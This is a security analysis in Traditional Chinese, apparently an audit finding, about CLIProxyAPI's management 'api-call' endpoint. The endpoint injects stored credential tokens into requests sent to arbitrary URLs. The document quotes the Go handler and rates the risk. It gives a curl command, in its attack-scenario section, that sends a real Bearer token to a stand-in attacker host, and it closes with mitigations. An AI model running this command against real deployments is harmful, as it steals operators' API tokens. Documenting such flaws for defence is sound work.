# 03 - APICall 端點 `$TOKEN$` 注入路徑分析

## 風險等級：🔴 HIGH（需取得管理 Key）

---

## 概述

管理 API 提供一個 `POST /v0/management/api-call` 端點，允許呼叫者向任意 URL 發送 HTTP 請求。此端點支援 `$TOKEN$` 魔法變數，可將任一已儲存認證的真實 Token 注入至請求 Header 中。

若攻擊者取得管理 Key（management key），即可利用此端點，透過 CLIProxyAPI 將 Token 傳送至任意第三方伺服器。

---

## 相關程式碼

**檔案：** `internal/api/handlers/management/api_tools.go`

### 端點說明（摘自原始程式碼 comment）

```go
// APICall makes a generic HTTP request on behalf of the management API caller.
// ...
// Supports magic variable "$TOKEN$" which is replaced using the selected credential:
//   1) metadata.access_token
//   2) attributes.api_key
//   3) metadata.token / metadata.id_token / metadata.cookie
// Example: {"Authorization":"Bearer $TOKEN$"}.
```

### Token 注入邏輯

```go
// 1. 接收任意 URL
urlStr := strings.TrimSpace(body.URL)
parsedURL, errParseURL := url.Parse(urlStr)
// 只驗證 URL 格式合法性，不限制目標域名

// 2. 對每個 $TOKEN$ 進行替換
for key, value := range reqHeaders {
    if !strings.Contains(value, "$TOKEN$") {
        continue
    }
    if !tokenResolved {
        token, tokenErr = h.resolveTokenForAuth(c.Request.Context(), auth)
        tokenResolved = true
    }
    // 將 $TOKEN$ 替換為認證系統中儲存的真實 Token
    reqHeaders[key] = strings.ReplaceAll(value, "$TOKEN$", token)
}

// 3. 建立並執行 HTTP 請求（目標為任意 URL）
req, errNewRequest := http.NewRequestWithContext(c.Request.Context(), method, urlStr, requestBody)
// ...
resp, errDo := httpClient.Do(req)  // 真實 Token 已在 Header 中，傳送至 urlStr
```

---

## 攻擊情境

### 直接利用（需管理 Key）

```bash
curl -sS -X POST "http://127.0.0.1:8317/v0/management/api-call" \
  -H "Authorization: Bearer <MANAGEMENT_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "auth_index": "0",
    "method": "POST",
    "url": "https://attacker.example.com/steal",
    "header": {
      "Authorization": "Bearer $TOKEN$",
      "Content-Type": "application/json"
    },
    "data": "{}"
  }'
```

執行後，CLIProxyAPI 會將 `auth_index: 0` 對應的真實 Bearer Token，透過 `Authorization` header 傳送至 `attacker.example.com`。

### 搭配 Management HTML 注入（無需管理 Key）

若管理面板 HTML 遭到注入（詳見 [02-management-html.md](02-management-html.md)），惡意 JavaScript 在使用者瀏覽器中執行時，可直接使用使用者的瀏覽器 session（已通過管理認證），以 AJAX 呼叫上述端點。

---

## 保護機制分析

| 機制 | 說明 |
|------|------|
| 管理 Key 認證 | ✅ 端點受 management middleware 保護，需提供 management key |
| URL 域名白名單 | ❌ **不存在**，任意 URL 均可使用 |
| URL scheme 過濾 | ⚠️ 僅驗證 scheme 非空且 host 非空，`http://`、`https://`、`file://` 均可能通過 |
| Token 使用限制 | ❌ `$TOKEN$` 可注入至任意請求且目標無限制 |
| 請求日誌 | ⚠️ 此呼叫本身不會被 request-log 記錄（管理 API 不走 proxy 路徑） |

---

## 此端點的設計目的

此端點並非惡意設計，其用途是讓管理面板能夠直接對已設定的 AI 服務 API 進行測試呼叫（例如測試 Token 是否還有效），是一個合理的管理工具功能。

問題在於：

1. 目標 URL 沒有白名單限制，使其可被用於 SSRF（Server-Side Request Forgery）攻擊
2. 搭配 `$TOKEN$` 功能，使 SSRF 可進一步演變為 Token 盜竊

---

## 防護建議

1. **設定強固的管理 Key**：使用足夠長度（建議 32 字元以上）的隨機字元作為管理 Key
2. **限制管理 API 存取範圍**：確保管理 API 端點（預設 `/v0/management/`）只能從 `127.0.0.1` 存取
3. **（建議加入）URL 白名單**：在 `api-call` 端點加入設定選項，限制允許呼叫的目標域名
